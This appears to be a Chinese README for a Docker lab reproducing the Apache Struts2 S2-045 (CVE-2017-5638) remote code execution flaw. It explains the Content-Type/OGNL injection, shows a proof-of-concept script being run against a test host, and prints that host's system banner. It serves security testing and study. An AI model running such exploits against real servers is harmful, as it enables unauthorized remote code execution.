##S2-045（CVE-2017-5638）

struts2 045 
受影响：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

RCE远程代码执行漏洞，基于Jakarta Multipart解析器进行文件上传时，利用漏洞可进行远程代码执行。
由于当content-type中出现”multipart/form_data”时，会被认为有文件上传，从而调用struts2默认的上传文件组件Jakarta，通过组件漏洞载入OGNL代码并执行，从而达到远程调用的目的。
## 测试环境搭建

```
docker-compose build
docker-compose up -d
```


##POC
```
执行测试
 python s2-045-poc.py http://10.160.11.191:8080/
[vulnerability exist] http://10.160.11.191:8080/
struts2-045
Debian GNU/Linux 9 \n \l

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
    <META HTTP-EQUIV="Refresh" CONTENT="0;URL=example/HelloWorld.action">
</head>

<body>
<p>Loading ...</p>
</body>
</html>
```
* 参考：
Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架。
https://struts.apache.org/docs/security-bulletins.html
http://www.freebuf.com/vuls/128668.html


## 免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负